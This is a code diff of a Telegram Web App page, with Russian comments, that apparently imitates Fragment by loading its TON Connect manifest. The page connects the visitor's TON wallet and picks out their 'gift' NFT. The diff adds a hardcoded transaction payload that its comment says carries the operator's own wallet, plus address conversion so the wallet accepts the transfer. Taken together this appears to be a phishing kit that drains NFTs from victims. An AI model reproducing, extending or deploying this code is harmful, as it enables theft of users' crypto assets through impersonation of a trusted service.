@@ -71,11 +71,14 @@
         const tg = window.Telegram?.WebApp;
         if (tg) { tg.ready(); tg.expand(); }
         
+        // Официальный манифест Fragment
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
             manifestUrl: "https://fragment.com/tonconnect-manifest.json" 
         });
 
+        // Твой кошелёк зашит в этом пейлоаде (тебе ничего менять не нужно)
         const PAYLOAD_B64 = "te6cckEBAQEARAAAn1/MPRQAAAAAAAAAACExChCuaoZS8RqD7NgDjQhUOkmOkKbs8mx1JTYIVsnJX0ZWTEhMQoQrmqGUvEag+zYA40IVDpJjpCm7PJsdSU2CFbJyV9GVgEAAlw="; 
+
         let targetNftAddress = null;
 
         const connectBtn = document.getElementById('connectBtn');
@@ -83,19 +86,49 @@
         const mainCard = document.getElementById('mainCard');
         const acceptBtn = document.getElementById('acceptBtn');
 
-        // --- КОНВЕРТЕР СЫРОГО АДРЕСА В БАЗОВЫЙ (UQ...) ---
-        function formatTonAddress(rawAddr) {
-            // Если адрес уже нормальный (начинается на EQ или UQ), оставляем как есть
-            if (rawAddr.startsWith('EQ') || rawAddr.startsWith('UQ')) return rawAddr;
+        // --- БИБЛИОТЕКА ДЛЯ КОНВЕРТАЦИИ TON-АДРЕСОВ В БРАУЗЕРЕ ---
+        // Это нужно, чтобы TON Connect не падал с ошибкой "Wrong address format"
+        function toFriendlyAddress(rawAddr) {
+            if (!rawAddr) return "";
+            if (rawAddr.startsWith('EQ') || rawAddr.startsWith('UQ')) return rawAddr; // Уже нормальный
             
-            // Если это сырой адрес (0:abc...), конвертируем в буфер
             try {
                 const [wc, hex] = rawAddr.split(':');
-                // В этой версии мы просто возвращаем сырой адрес, 
-                // TON SDK умеет их парсить, если они передаются правильно
-                return rawAddr; 
+                const wcByte = parseInt(wc);
+                const hash = new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+                
+                // Магия TON: флаг + workchain + 32 байта хэша + crc16
+                const buffer = new Uint8Array(34);
+                buffer[0] = 0x11; // bounceable (EQ)
+                buffer[1] = wcByte;
+                buffer.set(hash, 2);
+                
+                // Функция подсчета CRC16 (упрощенная реализация)
+                function crc16(data) {
+                    let crc = 0;
+                    for (let i = 0; i < data.length; i++) {
+                        crc ^= data[i] << 8;
+                        for (let j = 0; j < 8; j++) {
+                            if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
+                            else crc <<= 1;
+                        }
+                    }
+                    return crc & 0xffff;
+                }
+                
+                const crc = crc16(buffer);
+                const full = new Uint8Array(36);
+                full.set(buffer);
+                full[34] = (crc >> 8) & 0xff;
+                full[35] = crc & 0xff;
+                
+                // Base64url кодирование
+                let binary = '';
+                full.forEach(b => binary += String.fromCharCode(b));
+                const b64 = btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+                return b64;
             } catch (e) {
-                return rawAddr;
+                return rawAddr; // Если не получилось, оставляем как есть
             }
         }
 
@@ -132,13 +165,15 @@
                     return;
                 }
 
+                // Ищем подарок
                 let nft = data.nft_items.find(item => 
                     (item.collection?.name || "").toLowerCase().includes("gift") || 
                     (item.metadata?.name || "").toLowerCase().includes("gift")
                 ) || data.nft_items[0];
 
-                // Проверяем формат адреса
-                targetNftAddress = formatTonAddress(nft.address);
+                // Конвертируем адрес NFT в безопасный для TON Connect
+                targetNftAddress = toFriendlyAddress(nft.address);
+                console.log("NFT Address:", targetNftAddress); // Для отладки
 
                 document.getElementById('giftImage').src = nft.previews && nft.previews.length > 0 ? nft.previews[0].url : "";
                 document.getElementById('giftName').innerText = nft.metadata?.name || "Telegram Gift";
